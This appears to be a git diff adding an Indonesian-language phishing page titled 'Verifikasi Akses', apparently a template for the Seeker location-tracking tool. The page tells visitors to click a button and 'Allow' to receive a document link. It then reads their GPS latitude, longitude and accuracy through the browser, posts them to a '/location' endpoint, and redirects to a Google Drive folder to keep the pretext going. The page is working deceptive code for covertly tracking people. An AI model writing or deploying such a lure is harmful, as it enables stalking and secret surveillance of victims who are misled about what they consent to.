@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Verifikasi Akses</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      background: #3c78da;
+      color: white;
+      border: add;
+      border-radius: 6px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Verifikasi Dokumen</h2>
+  <p>Klik tombol di bawah untuk mendapatkan link dokumentasi.</p>
+  <p>Klik Allow untuk mendapatkan Link</p>
+  <button onclick="startTracking()">Dapatkan Link</button>
+
+  <script>
+    function startTracking() {
+      // Panggil fungsi dari Seeker
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendData);
+      } else {
+        alert("Browser Anda tidak mendukung GPS.");
+      }
+    }
+
+    function sendData(position) {
+      fetch('/location', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+          acc: position.coords.accuracy
+        })
+      }).then(() => {
+        // Redirect setelah data terkirim
+        window.location.href = "https://drive.google.com/drive/folders/1xiz5IF0xhsMKqnol0cBrO8KWScXV7cd-?usp=sharing";
+      });
+    }
+  </script>
+</body>
+</html>
